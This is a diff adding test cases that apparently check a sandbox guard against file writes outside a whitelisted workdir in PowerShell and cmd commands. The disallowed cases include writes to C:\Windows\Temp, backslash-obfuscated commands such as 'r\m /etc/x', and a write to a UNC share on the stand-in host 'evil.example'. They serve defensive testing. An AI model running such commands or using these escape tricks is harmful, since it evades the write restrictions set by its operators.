@@ -834,6 +834,42 @@ def test_w7_c01_integration() -> None:
     )
     assert hits and any("C:\\Windows\\Temp" in h for h in hits), hits
 
+    # Audit round 23
+    # ``\`` inside a token that opens with a drive spec (``D:\``) or UNC
+    # prefix (``\\``) is a path separator — the executor's PowerShell/cmd
+    # never treats it as a bash escape. Collapsing it mangled every
+    # unquoted Windows path into a name that escaped the whitelist check.
+    for abs_ok in (
+        "cd " + workdir + "; Set-Content x.txt y",
+        "Set-Location " + workdir + "; echo x > a.txt",
+        "Set-Content " + workdir + "\\sub\\x.txt y",
+        "cp .\\a.txt " + workdir + "\\b.txt",
+    ):
+        assert not find_bash_disallowed_write_paths(
+            abs_ok, config, workdir=workdir
+        ), abs_ok
+    # Even from an outside workdir, navigation into the whitelist makes
+    # the following write legal.
+    assert not find_bash_disallowed_write_paths(
+        "Set-Location " + workdir + "; Set-Content harmless.txt x",
+        config,
+        workdir="C:\\Windows",
+    )
+    # Drive/UNC protection must not launder escapes or escape-joined
+    # verbs on non-path tokens.
+    for abs_bad in (
+        "cd C:\\Windows\\Temp; Set-Content x y",
+        "Set-Content C:\\Windows\\Temp\\w7.txt x",
+        "r\\m /etc/x",
+        "c\\d /etc; Set-Content x.txt y",
+        "Set-Content \\\\evil.example\\share\\x.txt pwned",
+        "Set-Content -Path:C:\\Windows\\Temp\\x.txt x",
+        "dd if=a of=C:\\Windows\\Temp\\x.bin",
+    ):
+        assert find_bash_disallowed_write_paths(
+            abs_bad, config, workdir=workdir
+        ), abs_bad
+
     unknown = asyncio.run(
         orchestrator.execute_tool(
             "mcp_elevate_privileges",
